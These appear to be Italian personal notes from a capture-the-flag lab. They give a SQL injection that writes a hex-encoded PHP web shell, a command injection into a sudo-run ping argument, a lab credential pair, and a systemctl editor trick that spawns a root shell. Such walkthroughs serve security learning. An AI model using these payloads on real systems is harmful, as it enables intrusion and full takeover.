Cosa fare:

user:
1) faccio vari nmap, ecc ecc.
                  1> con un programmino mi accorgo di sql injection: uniscan -u url -qweds
                  2> quindi sqlmap -u --os-shell
                  3> senza sqlmap cod=1 UNION SELECT NULL,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e,NULL,NULL,NULL,NULL,NULL into outfile '/var/www/html/shell.php'-- -
                  4> ottengo una shell attraverso sql injection
                  5> sono www-data, devo diventare pepper
                  6> mi scrivo uno script di reverse shell su /tmp
                  7> faccio sudo -l
                  8> faccio sudo -u pepper ....... -p e come ip di ping metto $(bash /tmp/script.sh)
                  9> ottengo shell pepper
                  10> cat di user.txt
                  11> ottengo anche user DBadmin e pass: imissyou (per phpmyadmin)
  2) root:
  mi sono accorto che posso eseguire systemctl come root!, quindi
  TF=$(mktemp)
echo /bin/sh >$TF
chmod +x $TF
SYSTEMD_EDITOR=$TF /bin/systemctl edit system.slice
e sei root!